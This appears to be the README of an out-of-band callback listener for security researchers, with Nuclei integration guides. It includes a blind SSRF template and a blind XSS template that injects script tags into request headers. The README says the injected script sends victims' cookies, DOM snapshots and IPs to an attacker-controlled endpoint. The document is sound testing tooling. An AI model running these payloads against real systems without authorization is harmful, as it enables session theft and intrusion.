# 🛰️ Webhook Inspector (Kestrel Ghost)

> **Private, Stealth, and Fast Out-of-Band (OOB) Ingestion & Webhook Listener for Security Researchers and Bug Bounty Hunters.**

[![Next.js](https://img.shields.io/badge/Next.js-16.2-black?style=flat&logo=next.js)](https://nextjs.org/)
[![React](https://img.shields.io/badge/React-19.2-blue?style=flat&logo=react)](https://react.dev/)
[![ProjectDiscovery Nuclei](https://img.shields.io/badge/Nuclei-Ready-blueviolet?style=flat&logo=github)](https://nuclei.projectdiscovery.io/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## 📖 Overview

**Webhook Inspector** (*code name: `kestrel_ghost`*) is an out-of-band (OOB) interaction listener and webhook debugger designed to capture callbacks from:
- **Blind Server-Side Request Forgery (SSRF)**
- **Blind XML External Entity (XXE)**
- **Blind Remote Code Execution (RCE) / Log4j pingbacks**
- **Blind Cross-Site Scripting (XSS)**
- **Third-party webhook integrations (GitHub, Stripe, custom APIs)**

All captured requests, headers, query parameters, bodies, and client IPs are recorded in real time and displayed with a dashboard interface backed by Vercel KV.

---

## 🚀 Getting Started

### Prerequisites
- Node.js `20.x` or later (or `bun` / `pnpm` / `npm`)
- Vercel KV (Redis) credentials if deploying to production

### Installation & Local Run

```bash
# Clone the repository
git clone https://github.com/robbypranata/webhook-inspector.git
cd webhook-inspector

# Install dependencies
npm install

# Run the development server
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

---

## 🎯 Nuclei Integration Guide

Webhook Inspector is designed to work as an Out-of-Band (OOB) listener and notification receiver for **[ProjectDiscovery Nuclei](https://github.com/projectdiscovery/nuclei)**.

```
+------------------+         (1) Trigger Payload        +------------------+
|                  | ---------------------------------> |                  |
|  Nuclei Engine   |                                    |   Target App /   |
|                  |                                    |   Vulnerable Svc |
+------------------+                                    +------------------+
         ^                                                        |
         |                                                        | (2) OOB Callback
         |                                                        v
+------------------+         (3) View Realtime Pingback +------------------+
| Security Analyst | <================================= | Webhook          |
| Dashboard        |                                    | Inspector (OOB)  |
+------------------+                                    +------------------+
```

---

### 1. OOB Interaction & Blind SSRF / RCE Testing

You can use your Webhook Inspector endpoint `/api/r/<ENDPOINT-ID>` directly inside custom Nuclei YAML templates as a dedicated callback listener.

#### Example Custom Nuclei Template (`ssrf-oob-inspector.yaml`):

```yaml
id: custom-ssrf-webhook-inspector

info:
  name: Blind SSRF Detection via Webhook Inspector
  author: robbypranata
  severity: high
  description: Detects out-of-band SSRF callbacks by triggering HTTP pingbacks to Webhook Inspector.
  tags: ssrf,oob,blind

variables:
  # Replace with your deployed Webhook Inspector URL and Endpoint ID
  inspector_host: "https://your-webhook-inspector.vercel.app"
  endpoint_id: "sec-recon-01"

http:
  - raw:
      - |
        GET /api/v1/fetch?url={{inspector_host}}/api/r/{{endpoint_id}}?src=nuclei-ssrf HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

      - |
        POST /webhook/test HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"callback_url": "{{inspector_host}}/api/r/{{endpoint_id}}?src=nuclei-post"}

    stop-at-first-match: true
```

#### Running the Template with Nuclei:
```bash
# Scan a single target
nuclei -u https://target.com -t ssrf-oob-inspector.yaml

# Scan a target list using custom templates directory
nuclei -l targets.txt -t C:\templates\ -s critical,high
```

---

### 2. Blind XSS Triggering via Nuclei

Webhook Inspector includes a Blind XSS callback handler (`/api/x`). You can insert Blind XSS payloads in parameters or headers during Nuclei scans.

#### Example Nuclei XSS Header Fuzzing Template:

```yaml
id: blind-xss-webhook-inspector

info:
  name: Blind XSS Probe Injection
  author: robbypranata
  severity: medium
  tags: xss,blind-xss,oob

variables:
  inspector_host: "https://your-webhook-inspector.vercel.app"
  endpoint_id: "xss-hunter"

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"

    headers:
      User-Agent: '"><script src="{{inspector_host}}/api/x?id={{endpoint_id}}"></script>'
      X-Forwarded-For: '"><script src="{{inspector_host}}/api/x?id={{endpoint_id}}"></script>'
      Referer: '"><script src="{{inspector_host}}/api/x?id={{endpoint_id}}"></script>'
```

When an administrator or backend dashboard views the logged headers, the script triggers a callback to `/api/x/callback`, recording the victim's:
- Document URI & Referrer
- Cookies (if accessible)
- DOM / HTML snapshot
- IP address & Browser User-Agent

---

### 3. Forwarding Nuclei Scan Findings to Webhook Inspector

You can configure Nuclei to automatically stream real-time vulnerability scan results directly into a Webhook Inspector endpoint.

#### Setup `issue-tracker` / Webhook in Nuclei Configuration:

Create or edit `~/.config/nuclei/reporting-config.yaml` (or pass via `-rc`):

```yaml
# reporting-config.yaml
webhook:
  - id: webhook-inspector
    server-url: "https://your-webhook-inspector.vercel.app/api/r/nuclei-scan-results"
    username: ""
    password: ""
```

#### Execute Nuclei with Webhook Reporting:
```bash
nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml
```

Every detected vulnerability will be delivered in real-time as a JSON payload to your Webhook Inspector dashboard at `/dashboard/nuclei-scan-results`.

---

## 📡 API Endpoints Reference

| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/api/r/[id]` | `ALL` (`GET`, `POST`, `PUT`, `DELETE`, etc.) | **Ingestion Endpoint:** Captures raw requests, headers, query params, and body. |
| `/api/r/[id]/config` | `GET`, `POST` | **Custom Response Maker:** Configure custom status codes, headers, and response body. |
| `/api/inspect/[id]` | `GET`, `DELETE` | **Inspection API:** Fetch or clear recorded requests for the dashboard. |
| `/api/x` | `GET` | **Blind XSS Payload Server:** Serves the XSS JavaScript payload. |
| `/api/x/callback` | `POST` | **XSS Callback Handler:** Ingests harvested XSS execution context and DOM data. |
| `/dashboard/[id]` | `GET` | **Web UI Dashboard:** Real-time stream of incoming captured requests. |

---

## 🛠️ Deploying to Vercel

The fastest way to deploy Webhook Inspector:

1. Push this repository to GitHub.
2. Import the project into **[Vercel](https://vercel.com)**.
3. Link a **Vercel KV (Redis)** database in the Vercel Storage tab.
4. Deploy and your OOB Webhook Inspector is live!

---

## 📜 License

This project is licensed under the MIT License.
